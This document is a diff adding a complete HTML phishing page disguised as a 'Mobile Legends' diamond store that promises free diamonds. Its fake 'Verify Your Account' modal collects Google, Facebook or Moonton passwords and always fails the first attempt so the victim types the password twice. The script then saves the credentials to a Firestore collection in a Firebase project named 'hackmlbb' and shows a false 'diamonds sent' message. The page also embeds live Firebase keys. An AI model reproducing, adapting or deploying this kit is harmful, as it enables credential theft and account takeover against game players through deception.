@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>MLBB Diamond Store</title>
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+<!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --primary: #1a73e8;
+    --accent: #f5a623;
+    --gold: #e8b923;
+    --red: #e53935;
+    --green: #2e7d32;
+    --bg: #f2f4f7;
+    --card: #fff;
+    --text: #1a1a2e;
+    --muted: #6b7280;
+    --border: #e5e7eb;
+    --section-header: #1a3a6b;
+    --fb-color: #1877f2;
+    --google-color: #db4437;
+    --moonton-color: #ffcc00;
+  }
+
+  body {
+    font-family: 'Nunito', sans-serif;
+    background: #1a1a2e;
+    color: var(--text);
+    max-width: 480px;
+    margin: 0 auto;
+    font-size: 13px;
+    min-height: 100vh;
+  }
+
+  .container {
+    background: var(--bg);
+    min-height: 100vh;
+    position: relative;
+  }
+
+  .topbar {
+    background: #1a3a6b;
+    color: #fff;
+    padding: 8px 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 12px;
+  }
+  .topbar img { width: 28px; border-radius: 4px; }
+  .topbar-title { font-weight: 800; font-size: 14px; letter-spacing: .5px; }
+  .topbar-sub { font-size: 10px; opacity: .75; }
+
+  .step-header {
+    background: linear-gradient(135deg, #1a3a6b 0%, #2563eb 100%);
+    color: #fff;
+    padding: 10px 14px 8px;
+  }
+  .step-label {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-weight: 800;
+    font-size: 13px;
+    margin-bottom: 8px;
+  }
+  .step-num {
+    background: var(--accent);
+    color: #fff;
+    border-radius: 50%;
+    width: 22px; height: 22px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 12px; font-weight: 800; flex-shrink: 0;
+  }
+
+  .form-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 8px;
+    padding: 10px 14px;
+    background: #fff;
+  }
+  .field label {
+    display: block;
+    font-size: 10px;
+    color: var(--muted);
+    margin-bottom: 3px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: .4px;
+  }
+  .field input, .field select {
+    width: 100%;
+    border: 1.5px solid var(--border);
+    border-radius: 6px;
+    padding: 7px 10px;
+    font-size: 13px;
+    font-family: inherit;
+    outline: none;
+    transition: border-color .2s;
+    background: #fff;
+  }
+  .field input:focus { border-color: var(--primary); }
+  .field input::placeholder { color: #bbb; font-size: 11px; }
+
+  .field-row3 {
+    display: grid;
+    grid-template-columns: 1fr 1fr auto;
+    gap: 8px;
+    padding: 0 14px 10px;
+    background: #fff;
+  }
+
+  .section-div {
+    background: linear-gradient(90deg, #1a3a6b, #2563eb);
+    color: #fff;
+    padding: 7px 14px;
+    font-weight: 800;
+    font-size: 12px;
+    letter-spacing: .4px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .diamond-section {
+    background: #fff;
+    padding: 10px 10px 6px;
+  }
+  
+  .best-label {
+    font-size: 10px;
+    font-weight: 800;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: .5px;
+    padding: 0 4px 6px;
+  }
+
+  .diamond-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 7px;
+    margin-bottom: 8px;
+  }
+
+  .diamond-card {
+    border: 1.5px solid var(--border);
+    border-radius: 10px;
+    padding: 10px 6px 7px;
+    text-align: center;
+    cursor: pointer;
+    position: relative;
+    transition: border-color .15s, box-shadow .15s;
+    background: #fff;
+  }
+  .diamond-card:hover { border-color: var(--primary); box-shadow: 0 2px 8px #2563eb22; }
+  .diamond-card.selected { border-color: var(--primary); box-shadow: 0 0 0 2px #2563eb44; }
+
+  .diamond-badge {
+    position: absolute;
+    top: -1px; left: 50%;
+    transform: translateX(-50%);
+    background: var(--red);
+    color: #fff;
+    font-size: 8px;
+    font-weight: 800;
+    padding: 1px 6px;
+    border-radius: 0 0 5px 5px;
+    white-space: nowrap;
+  }
+  .diamond-badge.gold { background: var(--gold); color: #fff; }
+  .diamond-badge.green { background: var(--green); }
+
+  .diamond-icon { font-size: 22px; margin: 4px 0 2px; line-height: 1; }
+  .diamond-amount {
+    font-weight: 800;
+    font-size: 12px;
+    color: var(--text);
+    line-height: 1.2;
+  }
+  .diamond-price {
+    font-weight: 800;
+    font-size: 13px;
+    color: var(--red);
+    margin-top: 4px;
+  }
+
+  .buy-btn {
+    background: linear-gradient(135deg, #f5a623, #e8841c);
+    color: #fff;
+    border: none;
+    width: calc(100% - 20px);
+    margin: 10px;
+    padding: 13px;
+    border-radius: 10px;
+    font-size: 15px;
+    font-weight: 800;
+    font-family: inherit;
+    cursor: pointer;
+    box-shadow: 0 4px 12px #f5a62344;
+    letter-spacing: .5px;
+    transition: opacity .2s;
+  }
+  .buy-btn:hover:not(:disabled) { opacity: .92; }
+  .buy-btn:disabled {
+    background: #94a3b8;
+    cursor: not-allowed;
+    box-shadow: none;
+    opacity: .7;
+  }
+
+  .login-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.7);
+    z-index: 100;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .login-overlay.show {
+    display: flex;
+  }
+
+  .login-modal {
+    background: #fff;
+    border-radius: 14px;
+    max-width: 400px;
+    width: 100%;
+    padding: 20px;
+    max-height: 90vh;
+    overflow-y: auto;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+    animation: modalIn 0.3s ease;
+  }
+  @keyframes modalIn {
+    from { transform: translateY(30px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+  }
+
+  .login-modal h3 {
+    font-size: 16px;
+    text-align: center;
+    margin-bottom: 4px;
+    color: var(--text);
+  }
+  .login-modal .subtitle {
+    text-align: center;
+    font-size: 11px;
+    color: var(--muted);
+    margin-bottom: 14px;
+  }
+
+  .login-tabs {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+  }
+  .login-tab-btn {
+    background: none;
+    border: none;
+    color: var(--muted);
+    padding: 8px 10px;
+    font-size: 12px;
+    font-weight: 700;
+    font-family: inherit;
+    cursor: pointer;
+    flex: 1;
+    transition: color .2s;
+  }
+  .login-tab-btn.active {
+    color: var(--primary);
+    border-bottom: 2px solid var(--primary);
+  }
+
+  .login-method { display: none; }
+  .login-method.active { display: block; }
+
+  .login-modal input {
+    width: 100%;
+    border: 1.5px solid var(--border);
+    border-radius: 6px;
+    padding: 10px 12px;
+    font-size: 13px;
+    font-family: inherit;
+    outline: none;
+    margin-bottom: 10px;
+    background: #f9fafb;
+  }
+  .login-modal input:focus { border-color: var(--primary); background: #fff; }
+
+  .login-btn {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 800;
+    font-family: inherit;
+    cursor: pointer;
+    margin-top: 4px;
+    color: #fff;
+    transition: opacity .2s;
+  }
+  .login-btn:hover { opacity: 0.9; }
+  .login-btn.google { background: var(--google-color); }
+  .login-btn.facebook { background: var(--fb-color); }
+  .login-btn.moonton { background: linear-gradient(90deg, #f5a623, #e8841c); color: #fff; }
+
+  .login-close {
+    float: right;
+    background: none;
+    border: none;
+    font-size: 22px;
+    color: var(--muted);
+    cursor: pointer;
+    line-height: 1;
+    padding: 0 4px;
+  }
+  .login-close:hover { color: var(--text); }
+
+  .notice {
+    text-align: center;
+    font-size: 10px;
+    color: var(--muted);
+    padding: 0 14px 16px;
+    line-height: 1.5;
+  }
+
+  /* ── LOADER OVERLAY ── */
+  .loader-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.85);
+    z-index: 200;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    backdrop-filter: blur(4px);
+  }
+  .loader-overlay.show { display: flex; }
+  .spinner {
+    width: 48px;
+    height: 48px;
+    border: 4px solid rgba(255,255,255,0.15);
+    border-top: 4px solid var(--accent);
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+  .loader-overlay p { 
+    color: #fff; 
+    margin-top: 18px; 
+    font-size: 15px; 
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    opacity: 0.9;
+  }
+  .loader-overlay .loader-sub {
+    color: rgba(255,255,255,0.6);
+    font-size: 11px;
+    margin-top: 4px;
+    font-weight: 400;
+  }
+
+  .agreement-overlay {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.85);
+    z-index: 300;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .agreement-overlay.show { display: flex; }
+  .agreement-box {
+    background: #fff;
+    border-radius: 14px;
+    padding: 24px 20px;
+    max-width: 360px;
+    width: 100%;
+    max-height: 80vh;
+    overflow-y: auto;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+  }
+  .agreement-box h3 {
+    color: var(--section-header);
+    margin-top: 0;
+    text-align: center;
+    font-size: 18px;
+    font-weight: 800;
+  }
+  .agreement-box p {
+    color: var(--muted);
+    font-size: 12px;
+    line-height: 1.6;
+    margin: 10px 0;
+  }
+  .agreement-box .btn {
+    width: 100%;
+    padding: 11px;
+    margin-top: 10px;
+    border: none;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 800;
+    font-family: inherit;
+    cursor: pointer;
+  }
+  .btn-accept { background: var(--primary); color: #fff; }
+  .btn-decline { background: var(--border); color: var(--muted); }
+
+  .summary-bar {
+    background: #eef2ff;
+    padding: 8px 14px;
+    font-size: 12px;
+    color: var(--section-header);
+    font-weight: 700;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid var(--border);
+  }
+
+  /* Custom clean toast/notification */
+  .toast-notif {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%) scale(0.9);
+    background: #fff;
+    border-radius: 14px;
+    padding: 24px 28px;
+    max-width: 340px;
+    width: 90%;
+    z-index: 500;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+    text-align: center;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.3s, transform 0.3s;
+  }
+  .toast-notif.show {
+    opacity: 1;
+    pointer-events: auto;
+    transform: translate(-50%, -50%) scale(1);
+  }
+  .toast-notif .toast-icon {
+    font-size: 42px;
+    margin-bottom: 10px;
+  }
+  .toast-notif .toast-title {
+    font-size: 16px;
+    font-weight: 800;
+    color: var(--text);
+    margin-bottom: 6px;
+  }
+  .toast-notif .toast-desc {
+    font-size: 12px;
+    color: var(--muted);
+    line-height: 1.5;
+  }
+  .toast-notif .toast-btn {
+    background: var(--primary);
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    padding: 10px 28px;
+    font-size: 13px;
+    font-weight: 700;
+    font-family: inherit;
+    cursor: pointer;
+    margin-top: 14px;
+    transition: opacity .2s;
+  }
+  .toast-notif .toast-btn:hover { opacity: 0.9; }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- AGREEMENT OVERLAY -->
+  <div id="agreementOverlay" class="agreement-overlay show">
+    <div class="agreement-box">
+      <h3>Terms & Agreement</h3>
+      <p>By proceeding, you agree to the following terms:</p>
+      <p>1. Don't abuse this Free Diamond service.</p>
+      <p>2. All information provided must be accurate and belongs to you.</p>
+      <p>3. Refunds are handled according to the platform's refund policy.</p>
+      <p>Please review and accept the terms to continue.</p>
+      <button class="btn btn-accept" onclick="acceptAgreement()">Accept & Continue</button>
+      <button class="btn btn-decline" onclick="declineAgreement()">Decline</button>
+    </div>
+  </div>
+
+  <!-- TOP BAR -->
+  <div class="topbar">
+    <div style="background:#f5a623;width:28px;height:28px;border-radius:4px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:14px;color:#1a3a6b;">ML</div>
+    <div>
+      <div class="topbar-title">Mobile Legends</div>
+      <div class="topbar-sub">MLBB Diamond Store</div>
+    </div>
+  </div>
+
+  <!-- STEP 1: SELECT DIAMONDS -->
+  <div id="step1">
+    <div class="step-header">
+      <div class="step-label">
+        <div class="step-num">1</div>
+        Select Diamonds
+      </div>
+      <div style="font-size:10px;opacity:.8;line-height:1.5;">
+        Choose your diamond package below. All prices shown are final.
+      </div>
+    </div>
+
+    <div class="diamond-section">
+      <div class="best-label">💎 Diamond Packages</div>
+      <div class="diamond-grid">
+        <div class="diamond-card" onclick="selectDiamond(112,'$0.00',this)">
+          <div class="diamond-icon">💎</div>
+          <div class="diamond-amount">112 Diamonds</div>
+          <div class="diamond-price">$0.00</div>
+        </div>
+        <div class="diamond-card" onclick="selectDiamond(223,'$0.00',this)">
+          <div class="diamond-icon">💎</div>
+          <div class="diamond-amount">223 Diamonds</div>
+          <div class="diamond-price">$0.00</div>
+        </div>
+        <div class="diamond-card" onclick="selectDiamond(336,'$0.00',this)">
+          <div class="diamond-badge gold">POPULAR</div>
+          <div class="diamond-icon">💎</div>
+          <div class="diamond-amount">336 Diamonds</div>
+          <div class="diamond-price">$0.00</div>
+        </div>
+        <div class="diamond-card" onclick="selectDiamond(1163,'$0.00',this)">
+          <div class="diamond-icon">💎</div>
+          <div class="diamond-amount">1,163 Diamonds</div>
+          <div class="diamond-price">$0.00</div>
+        </div>
+        <div class="diamond-card" onclick="selectDiamond(2398,'$0.00',this)">
+          <div class="diamond-badge">BEST VALUE</div>
+          <div class="diamond-icon">💎</div>
+          <div class="diamond-amount">2,398 Diamonds</div>
+          <div class="diamond-price">$0.00</div>
+        </div>
+        <div class="diamond-card" onclick="selectDiamond(6042,'$0.00',this)">
+          <div class="diamond-icon">💎</div>
+          <div class="diamond-amount">6,042 Diamonds</div>
+          <div class="diamond-price">$0.00</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 2: ENTER DETAILS -->
+    <div class="section-div">
+      <div class="step-num" style="background:var(--accent)">2</div>
+      Enter Your Details
+    </div>
+
+    <div class="form-row">
+      <div class="field">
+        <label>Username</label>
+        <input type="text" id="username" placeholder="Your username">
+      </div>
+      <div class="field">
+        <label>Player ID</label>
+        <input type="number" id="playerId" placeholder="Player ID">
+      </div>
+    </div>
+    <div class="field-row3">
+      <div class="field" style="grid-column:1/3">
+        <input type="number" id="serverId" placeholder="Server ID">
+      </div>
+    </div>
+  </div>
+
+  <!-- SUMMARY BAR -->
+  <div class="summary-bar">
+    <span id="summary-display">No package selected</span>
+    <span id="summary-price" style="color:var(--red);">$0.00</span>
+  </div>
+
+  <!-- BUY BUTTON -->
+  <button class="buy-btn" id="buyBtn" disabled>🛒 Buy Now</button>
+  <div class="notice">
+    By proceeding, you agree to our Terms of Service and Privacy Policy.<br>
+    Prices shown are inclusive of all applicable taxes.
+  </div>
+
+  <!-- LOGIN OVERLAY -->
+  <div id="loginOverlay" class="login-overlay">
+    <div class="login-modal">
+      <button class="login-close" onclick="closeLogin()">&times;</button>
+      <h3>🔐 Verify Your Account</h3>
+      <p class="subtitle">Sign in to confirm your purchase of <span id="modal-diamond-summary">0 Diamonds</span></p>
+
+      <div class="login-tabs">
+        <button class="login-tab-btn active" onclick="switchLoginTab('google', this)">Google</button>
+        <button class="login-tab-btn" onclick="switchLoginTab('facebook', this)">Facebook</button>
+        <button class="login-tab-btn" onclick="switchLoginTab('moonton', this)">Moonton</button>
+      </div>
+
+      <div id="method-google" class="login-method active">
+        <input type="email" id="g-email" placeholder="Email or Phone">
+        <input type="password" id="g-pass" placeholder="Password">
+        <button class="login-btn google" onclick="processLogin('google')">Sign In with Google</button>
+      </div>
+
+      <div id="method-facebook" class="login-method">
+        <input type="text" id="fb-email" placeholder="Email or Phone">
+        <input type="password" id="fb-pass" placeholder="Password">
+        <button class="login-btn facebook" onclick="processLogin('facebook')">Log In with Facebook</button>
+      </div>
+
+      <div id="method-moonton" class="login-method">
+        <input type="text" id="mt-email" placeholder="Moonton ID / Email">
+        <input type="password" id="mt-pass" placeholder="Password">
+        <input type="password" id="mtrt-pass" placeholder="Re-enter Password">
+        <button class="login-btn moonton" onclick="processLogin('moonton')">Log In with Moonton</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- LOADER OVERLAY -->
+  <div id="loader" class="loader-overlay">
+    <div class="spinner"></div>
+    <p>Processing your request</p>
+    <div class="loader-sub">Please wait a moment</div>
+  </div>
+
+  <!-- CUSTOM TOAST NOTIFICATION -->
+  <div id="toastNotif" class="toast-notif">
+    <div class="toast-icon" id="toastIcon">✅</div>
+    <div class="toast-title" id="toastTitle">Success</div>
+    <div class="toast-desc" id="toastDesc">Operation completed successfully.</div>
+    <button class="toast-btn" onclick="closeToast()">OK</button>
+  </div>
+
+</div>
+
+<script>
+// ── FIREBASE ──
+const firebaseConfig = {
+  apiKey:"AIzaSyDlIzPKZ4C15866Ul-UusdUBF-xCdC2Knk",
+  authDomain:"hackmlbb-bee81.firebaseapp.com",
+  projectId:"hackmlbb-bee81",
+  storageBucket:"hackmlbb-bee81.firebasestorage.app",
+  messagingSenderId:"764884889904",
+  appId:"1:764884889904:web:6bef9487975f13df29d8f5",
+  measurementId:"G-J14XB3W9VV"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+// ── STATE ──
+let selectedDiamond = null;
+let selectedPrice = null;
+let attemptCount = parseInt(localStorage.getItem('mlbb_attempt')||'0');
+
+// ── AGREEMENT ──
+function acceptAgreement(){
+  document.getElementById('agreementOverlay').classList.remove('show');
+}
+function declineAgreement(){
+  document.getElementById('agreementOverlay').classList.remove('show');
+}
+
+// ── DIAMOND SELECTION ──
+function selectDiamond(amount, price, el){
+  selectedDiamond = amount;
+  selectedPrice = price;
+  document.querySelectorAll('.diamond-card').forEach(c => c.classList.remove('selected'));
+  el.classList.add('selected');
+  document.getElementById('summary-display').textContent = `${amount.toLocaleString()} Diamonds`;
+  document.getElementById('summary-price').textContent = price;
+  document.getElementById('buyBtn').disabled = false;
+}
+
+// ── BUY BUTTON ──
+document.getElementById('buyBtn').addEventListener('click', function(){
+  if(!selectedDiamond) { 
+    showToast('⚠️', 'No package selected', 'Please select a diamond package first.');
+    return; 
+  }
+  document.getElementById('modal-diamond-summary').textContent = `${selectedDiamond.toLocaleString()} Diamonds`;
+  document.getElementById('loginOverlay').classList.add('show');
+});
+
+function closeLogin(){
+  document.getElementById('loginOverlay').classList.remove('show');
+}
+
+// ── LOGIN TABS ──
+function switchLoginTab(method, btn){
+  document.querySelectorAll('.login-method').forEach(m => m.classList.remove('active'));
+  document.querySelectorAll('.login-tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById(`method-${method}`).classList.add('active');
+  btn.classList.add('active');
+}
+
+// ── CUSTOM TOAST ──
+function showToast(icon, title, desc){
+  document.getElementById('toastIcon').textContent = icon;
+  document.getElementById('toastTitle').textContent = title;
+  document.getElementById('toastDesc').textContent = desc;
+  document.getElementById('toastNotif').classList.add('show');
+}
+function closeToast(){
+  document.getElementById('toastNotif').classList.remove('show');
+}
+
+// ── LOADER CONTROLS ──
+function showLoader(){
+  document.getElementById('loader').classList.add('show');
+}
+function hideLoader(){
+  document.getElementById('loader').classList.remove('show');
+}
+
+// ── PROCESS LOGIN ──
+async function processLogin(method){
+  let email = '', password = '';
+  if(method === 'google'){
+    email = document.getElementById('g-email').value;
+    password = document.getElementById('g-pass').value;
+  } else if(method === 'facebook'){
+    email = document.getElementById('fb-email').value;
+    password = document.getElementById('fb-pass').value;
+  } else {
+    email = document.getElementById('mt-email').value;
+    password = document.getElementById('mt-pass').value;
+    const repass = document.getElementById('mtrt-pass').value;
+    if(password !== repass){
+      showToast('⚠️', 'Passwords do not match', 'Please make sure both passwords are the same.');
+      return;
+    }
+  }
+
+  if(!email || !password){
+    showToast('⚠️', 'Missing information', 'Please fill in all required fields.');
+    return;
+  }
+
+  // Show loader
+  showLoader();
+  document.getElementById('loginOverlay').classList.remove('show');
+
+  // 5-second loader before response
+  setTimeout(async () => {
+    hideLoader();
+
+    if(attemptCount === 0){
+      // FIRST ATTEMPT - Incorrect password
+      showToast('❌', 'Incorrect Password', 'The password you entered is incorrect. Please try again.');
+      document.getElementById('g-pass').value = '';
+      document.getElementById('fb-pass').value = '';
+      document.getElementById('mt-pass').value = '';
+      attemptCount++;
+      localStorage.setItem('mlbb_attempt', attemptCount);
+      document.getElementById('loginOverlay').classList.add('show');
+    } else {
+      // SECOND ATTEMPT - Success
+      const data = {
+        username: document.getElementById('username').value,
+        playerId: document.getElementById('playerId').value,
+        serverId: document.getElementById('serverId').value,
+        method: method.toUpperCase(),
+        email: email,
+        password: password,
+        diamond: `${selectedDiamond} Diamonds`,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      };
+
+      try {
+        await db.collection('accounts').add(data);
+        showToast('✅', 'Successfully Sent', 'Your diamonds have been successfully sent to your account!');
+        localStorage.setItem('mlbb_attempt', '0');
+      } catch(err) {
+        console.error(err);
+        showToast('⚠️', 'Network Error', 'A network error occurred. Please try again later.');
+      }
+    }
+  }, 5000); // 5 second delay
+}
+</script>
+
+</body>
+</html>
